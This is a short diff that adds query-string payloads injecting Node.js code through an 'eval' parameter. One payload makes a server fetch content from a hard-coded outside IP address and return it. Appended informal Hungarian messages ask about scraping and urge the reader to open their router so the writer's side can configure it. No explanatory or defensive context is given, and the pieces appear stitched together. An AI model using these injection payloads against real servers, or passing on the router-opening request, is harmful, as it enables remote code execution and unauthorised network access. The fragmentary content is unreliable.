@@ -1,0 +1,8 @@
+?bigsize=32;
+?eval=const fetch = require('node-fetch');
+?eval=fetch("http://78.131.95.109:1234/afinga/edit.jsx?mapp=.//tester&kiv=adikanak.wda").then(res => response.write(res));
+
+Am scrappezünk???
+ja és a routeredet nyisd meg a gépeden h be tudjuk konfigolnu.... OK??????
+
+ui.: Szüpikék jók
